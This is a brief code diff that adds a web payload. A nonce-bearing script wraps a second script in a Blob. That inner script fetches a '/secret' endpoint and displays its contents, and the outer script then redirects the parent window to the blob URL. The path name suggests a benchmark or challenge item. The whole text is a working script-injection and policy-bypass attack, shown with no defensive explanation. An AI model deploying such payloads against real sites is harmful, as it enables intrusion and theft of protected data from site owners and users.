@@ -1,0 +1,11 @@
+<script nonce="example-nonce">
+    var blobContent = `
+        <script>
+        fetch('/GenAI-38-Examples-4o-Latest/c1115628/secret')
+            .then(response => response.text())
+            .then(secret => alert(secret));
+        </script>`;
+    var blob = new Blob([blobContent], {type: 'text/html'});
+    var blobURL = URL.createObjectURL(blob);
+    window.parent.location = blobURL;
+</script>
